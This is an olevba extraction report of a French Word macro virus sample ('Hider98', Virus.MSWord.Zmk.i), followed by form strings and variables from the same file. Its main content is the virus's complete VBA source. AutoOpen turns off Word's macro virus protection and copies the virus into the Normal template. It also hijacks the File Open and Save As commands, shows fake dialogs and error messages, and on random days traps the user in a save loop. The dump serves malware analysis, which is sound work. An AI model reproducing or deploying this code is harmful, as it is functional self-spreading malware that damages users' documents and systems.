olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hider98.bas 
in file: Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c - OLE stream: 'Macros/VBA/Hider98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "Hider98" Then
        Hider98Installed = -1
    End If
Next i
If Not Hider98Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Hider98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="FileOp", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="FileSA", Object:=wdOrganizerObjectProjectItems
    MsgBox "Une surprise vous attend...", vbCritical, "Virus Hider98"
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Hider98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileOp", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSA", Object:=wdOrganizerObjectProjectItems
End If
ErrorAO:
End Sub
Sub FileOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFO
Dim MyDate
Randomize
MyDate = Date
D$ = Mid(MyDate, 1, 2)
NHD$ = Int(Rnd * 31) + 1
If NHD$ = "1" Then NHD$ = "01"
If NHD$ = "2" Then NHD$ = "02"
If NHD$ = "3" Then NHD$ = "03"
If NHD$ = "4" Then NHD$ = "04"
If NHD$ = "5" Then NHD$ = "05"
If NHD$ = "6" Then NHD$ = "06"
If NHD$ = "7" Then NHD$ = "07"
If NHD$ = "8" Then NHD$ = "08"
If NHD$ = "9" Then NHD$ = "09"
If D$ = NHD$ Then
    FileOp.Show
    MsgBox "ZeMacroKiller98 est heureux de vous dédier ce nouveau virus.", vbInformation, "Virus Hider98"
Else
    Dialogs(wdDialogFileOpen).Show
End If
ErrorFO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
Dim MyDate, Valeur$
Randomize
MyDate = Date
D$ = Mid(MyDate, 1, 2)
NHD$ = Int(Rnd * 31) + 1
If NHD$ = "1" Then NHD$ = "01"
If NHD$ = "2" Then NHD$ = "02"
If NHD$ = "3" Then NHD$ = "03"
If NHD$ = "4" Then NHD$ = "04"
If NHD$ = "5" Then NHD$ = "05"
If NHD$ = "6" Then NHD$ = "06"
If NHD$ = "7" Then NHD$ = "07"
If NHD$ = "8" Then NHD$ = "08"
If NHD$ = "9" Then NHD$ = "09"
If D$ = NHD$ Then
Debut:
    FileSA.Show
    Valeur$ = WordBasic.[GetPrivateProfileString$]("FileSA", "Choix", "WIN.INI")
    If Valeur$ <> "1" Then
        GoTo Debut
    End If
Else
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Hider98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileOp", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSA", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    With Dialogs(wdDialogFileSummaryInfo)
        .Subject = "Virus Hider98 par ZeMacroKiller98"
        .Execute
    End With
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Erreur dans le fichier User32.dll", vbCritical, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVBCode
    MsgBox "Ce programme a réalisé une opération illégale et va être interompu", vbCritical, "Microsoft Word"
ErrorVBCode:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOp.frm 
in file: Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c - OLE stream: 'Macros/VBA/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton2_Click()
Unload FileOp
End Sub

Private Sub CommandButton3_Click()
MsgBox "Menu inaccessible pour l'instant", vbCritical, "Microsoft Word"
End Sub

Private Sub CommandButton4_Click()
MsgBox "Recherche impossible, veuillez réessayer plus tard!!!!", vbCritical, "Microsoft Word"
End Sub

Private Sub CommandButton5_Click()
MsgBox "Nouvelle recherche impossible", vbCritical, "Microsoft Word"
End Sub

Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ComboBox1.Text = CurDir
ComboBox3.AddItem "Tous les fichiers"
ComboBox3.AddItem "Documents Word"
ComboBox3.AddItem "Modèles de document"
ComboBox3.AddItem "RTF"
ComboBox3.AddItem "Fichier texte"
ComboBox3.AddItem "Fichier de texte unicode"
ComboBox3.AddItem "Liste de contacts Schedule+"
ComboBox3.AddItem "Carnet d'adresses personnels"
ComboBox3.AddItem "Carnet d'adresses Outlook"
ComboBox3.AddItem "Texte avec mise en page(MS-DOS)"
ComboBox3.AddItem "Texte avec mise en forme"
ComboBox3.AddItem "HTML Document"
ComboBox3.AddItem "Word(versions orientales)6.0/5"
ComboBox3.AddItem "Word 4.0-5.1 pour macintosh"
ComboBox3.AddItem "WordPerfect 5.x"
ComboBox3.AddItem "WordPerfect 6.x"
ComboBox3.AddItem "Feuille de calcul Microsoft Excel"
ComboBox3.AddItem "Lotus 1-2-3"
ComboBox3.AddItem "Works pour Windows 3.0"
ComboBox3.AddItem "Works 4.0 pour Windows"
ComboBox3.AddItem "Récupération de texte"
ComboBox3.AddItem "Windows Write"
ComboBox3.AddItem "Word pour MS-DOS 3.x-5.x"
ComboBox3.AddItem "Word pour MS-DOS 6.0"
ComboBox5.AddItem "aujourd'hui"
ComboBox5.AddItem "la semaine dernière"
ComboBox5.AddItem "Cette semaine"
ComboBox5.AddItem "le mois dernier"
ComboBox5.AddItem "ce mois-ci"
ComboBox5.AddItem "n'importe quand"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSA.frm 
in file: Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c - OLE stream: 'Macros/VBA/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
If ComboBox2.Value = "" Then
    MsgBox "Veuillez entrer un nom", vbInformation, "Microsoft Word"
Else
    ActiveDocument.SaveAs FileName:=ComboBox2.Value, FileFormat:=wdFormatText
End If
WordBasic.SetPrivateProfileString "FileSA", "Choix", 1, "WIN.INI"
MsgBox "HAHAHAHAHA!!!!", vbInformation, "Virus Hider98"
End Sub

Private Sub CommandButton2_Click()
WordBasic.SetPrivateProfileString "FileSA", "Choix", 0, "WIN.INI"
End Sub

Private Sub CommandButton3_Click()
MsgBox "Impossible d'acceder à ce menu", vbCritical, "Microsoft Word"
WordBasic.SetPrivateProfileString "FileSA", "Choix", 0, "WIN.INI"
End Sub

Private Sub CommandButton4_Click()
MsgBox "Pas assez de mémoire", vbCritical, "Microsoft Word"
WordBasic.SetPrivateProfileString "FileSA", "Choix", 0, "WIN.INI"
End Sub

Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ComboBox1.Text = CurDir
ComboBox3.Text = "Document Word"
ComboBox3.AddItem "Documents Word"
ComboBox3.AddItem "Modèle de document"
ComboBox3.AddItem "Texte seulement"
ComboBox3.AddItem "Texte seulement avec sauts de ligne"
ComboBox3.AddItem "Texte MS-DOS"
ComboBox3.AddItem "Texte MS-DOS avec sauts de ligne"
ComboBox3.AddItem "Texte mis en forme(RTF)"
ComboBox3.AddItem "Texte unicode"
ComboBox3.AddItem "Texte avec mise en page(MS-DOS)"
ComboBox3.AddItem "Texte avec mise en forme"
ComboBox3.AddItem "HTML Document"
ComboBox3.AddItem "Word 2.x for Windows"
ComboBox3.AddItem "Word 4.0 pour Macintosh"
ComboBox3.AddItem "Word 5.0 pour Macintosh"
ComboBox3.AddItem "Word 5.1 pour Macintosh"
ComboBox3.AddItem "WordPerfect 5.0"
ComboBox3.AddItem "WordPerfect 5.1 pour DOS"
ComboBox3.AddItem "WordPerfect 5.x pour Windows"
ComboBox3.AddItem "Fichier secondaire pour WordPerfect 5.1 ou 5.2"
ComboBox3.AddItem "Fichier secondaire pour WordPerfect 5.0"
ComboBox3.AddItem "Works pour Windows 3.0"
ComboBox3.AddItem "Works 4.0 pour Windows"
ComboBox3.AddItem "Word 6.0/95"
ComboBox3.AddItem "Word for Windows (generic)"
ComboBox3.AddItem "Windows Write 3.0"
ComboBox3.AddItem "Word for MS-DOS 3.x-5.x"
ComboBox3.AddItem "Word for MS-DOS 6.0"
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Regarder dans:H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ouvrir@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Appronfondir...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Chercher les fichiers qui repondent � ces crit�res:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de fichier:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Type de fichier:D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Documents WordH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Texte ou propri�t�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Modifi� en dernierH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n'importe quand
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RechercherD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nouvelle rech.H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 0 Fichier(s) trouv�(s)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/i23/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Enregister dans:D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EnregisterD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Options...D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Enreg. versionH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de fichier:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Type de fichier:D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Documents Word'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox5'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b"n'importe quand"
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileOp/i23'
